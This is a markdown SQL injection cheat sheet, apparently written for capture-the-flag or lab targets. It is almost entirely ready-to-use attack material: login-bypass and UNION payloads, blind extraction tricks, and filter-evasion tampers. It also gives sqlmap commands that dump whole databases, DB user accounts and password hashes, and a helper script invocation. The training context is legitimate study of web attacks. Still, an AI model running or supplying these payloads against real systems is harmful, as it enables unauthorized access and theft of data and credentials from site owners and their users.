# SQL Injection

## Goal
Make the query return more than intended: all rows, other tables, DB accounts.

**Fast path (script)** — run from the folder that contains `sql/`
```bash
python3 sql/sqlauto.py "http://$IP/page"           # finds the input (URL / form / JSON / cookie / header) → quick payloads → sqlmap with the right flags → tables + flags
python3 sql/sqlauto.py "http://$IP/page" --look    # only: inputs, what is filtered, the sqlmap command to paste
```
Output in `./out_sql/`. Options: `python3 sql/sqlauto.py -h`. Finds nothing / sqlmap not allowed → by hand below.
Remote server: page that prints rows ≈ 20 s, blind page ≈ 1–2 min. Faster blind: `--threads 4`. `429` / blocked: `--delay 1`.
Says "probably NOT SQL injection" → [06_lfi](06_lfi.md) (file / page name in the input) or [03_web_enum](03_web_enum.md) (number, cookie, `; id`).

**Checklist**
- [ ] injectable? add `'` → SQL error / broken or changed page
- [ ] 30 s by hand (Step 1) → then sqlmap (Step 2)
- [ ] where does the input travel? URL param · form POST · JSON body · cookie
- [ ] dump read fully (flag often in a table/row you were not shown)

# Commands

### Step 1: detect + quick wins (type into the box / param)
```text
'                    SQL error or broken page = injectable
1 or 1=1             number field → ALL rows, hidden ones too
' OR 1=1-- -         text field   → ALL rows          (variants: ' OR 1=1#     ' OR '1'='1)
admin' -- -          login: user box, any password → in as admin
' OR 1=1-- -         login: in as first user
```
`--` must be followed by a space → write `-- -`. From terminal let curl encode it:
```bash
curl -s -G "http://$IP/search.php" --data-urlencode "q=' OR 1=1-- -"
```

### Step 2: sqlmap (default route)
```bash
sqlmap -u "http://$IP/item.php?id=1" --batch --dbs                    # confirm + list databases
sqlmap -u "http://$IP/item.php?id=1" --batch -D <db> --tables
sqlmap -u "http://$IP/item.php?id=1" --batch -D <db> -T <table> --dump
sqlmap -u "http://$IP/item.php?id=1" --batch --dump                   # lazy: whole current DB
sqlmap -u "http://$IP/" --forms --batch --dump                        # no ?param in URL → it finds the form
sqlmap -u "http://$IP/" --crawl=2 --batch --dump                      # it finds injectable links itself
```
Input travels elsewhere:
```bash
sqlmap -u "http://$IP/login" --data "username=a&password=b" --batch --dump                                    # POST form
sqlmap -u "http://$IP/cart" --data='{"id":"1"}' --headers="Content-Type: application/json" --batch --dump     # JSON body
sqlmap -u "http://$IP/account" --cookie="uid=1*" --batch --dump                                               # cookie (* = inject here)
sqlmap -r req.txt --batch --dump                  # req.txt = request saved from Burp (right-click → Copy to file)
```
Find the request shape: F12 → Network → do the action → click the row → Payload / Headers / Cookies.
Page shows no input at all → guess the name, as URL param and as cookie; the size that differs gives it away:
```bash
for p in id uid user userid member account item q search sid session token; do echo "$p $(curl -s "http://$IP/account?$p=1" | wc -c) $(curl -s -b "$p=1" "http://$IP/account" | wc -c)"; done
```

DB accounts + password hashes ("authentication string" of a DB user). Keep the front part that already worked (`-u … --forms` / `--data` / `--cookie`), swap only the ending:
```bash
sqlmap -u "<url>" --batch --users --passwords
sqlmap -u "<url>" --batch -D mysql -T user -C User,Host,authentication_string --dump
sqlmap -u "<url>" --batch --current-user --current-db
```

### Step 3: by hand, UNION (page prints query results)
```text
' ORDER BY 1-- -    ' ORDER BY 2-- -   …      error at N → column count = N-1
' UNION SELECT 1,2,3-- -                      (one number per column) → numbers visible on page = printable slots
```
Put one of these in a printable slot (keep the other numbers):

| Want | MySQL / MariaDB | SQLite |
|---|---|---|
| version, db, user | `version()` `database()` `user()` | `sqlite_version()` |
| tables | `group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()` | `group_concat(name) FROM sqlite_master WHERE type='table'` |
| columns | `group_concat(column_name) FROM information_schema.columns WHERE table_name='<t>' AND table_schema=database()` | `sql FROM sqlite_master WHERE name='<t>'` |
| rows | `group_concat(<c1>,0x3a,<c2>) FROM <t>` | `group_concat(printf('%s:%s',<c1>,<c2>)) FROM <t>` |
| DB accounts | `group_concat(user,0x3a,authentication_string) FROM mysql.user` | n/a |

Example (2 columns, text box): `x' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -`
Number field → no quote: `0 UNION SELECT 1,2-- -`

### Step 4: blind (page only says found / not found) and filters
```bash
sqlmap -u "<url>?q=1" --batch --technique=B --string="<text only on the TRUE page>" --dump
sqlmap … --tamper=between,equaltolike      # app strips = < >   (sign: "1 AND 1=2" still answers true)
sqlmap … --tamper=space2comment            # spaces stripped
sqlmap … --tamper=randomcase               # blacklist knows only UNION / union → UnIoN passes
sqlmap … --risk=3 --level=2                # login form, or a value that matches no row ("not injectable" at default)
sqlmap … --base64=id                       # value is base64 (?id=MQ==)
sqlmap … --technique=BEU --threads 4       # skip the slow time-based tests, faster blind dump
sqlmap -u "<url>" --headers="X-Forwarded-For: 1*" --batch --risk=3 --string="<true text>" --dump     # input is a header (* = inject here)
# extra param is a hash of the injected one (e.g. h = md5(id); check: echo -n 1 | md5sum)
SQLMAP_UNSAFE_EVAL=1 sqlmap -u "http://$IP/orders?id=1&h=<hash>" -p id --batch \
  --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()" --dump
```
By hand: `1 AND (SELECT <col> FROM <t>) LIKE 'a%'` → true/false page → grow the prefix letter by letter.
App deletes the words UNION / SELECT once → nest them: `0 UNIunionON SELselectECT 1,2,3-- -`

### Helpline
```bash
# --batch = auto-answer prompts. Dumps are also saved: ~/.local/share/sqlmap/output/<host>/dump/
# "not injectable" → --risk=3 --level=2, then give --string="<true text>" ; stale/wrong result → --flush-session ; blocked → --random-agent
# --dbms=… can hide the fast error-based route (measured: 99 → 1045 requests) → leave it out.
# --eval error "'builtin_function_or_method' object has no attribute 'encode'" → no * in the URL; name the param with -p id.
# SQLite has one DB → no -D:  sqlmap … --tables   /   -T <table> --dump
# ' OR '1'='1 can fail where the comment form works → prefer  ' OR 1=1-- -
# --passwords asks "crack them?" → the hash itself is usually the answer; crack only if plaintext asked → [07_crack](07_crack.md)
# --eval refused → the SQLMAP_UNSAFE_EVAL=1 prefix is missing.
# zsh: always quote the URL.
```
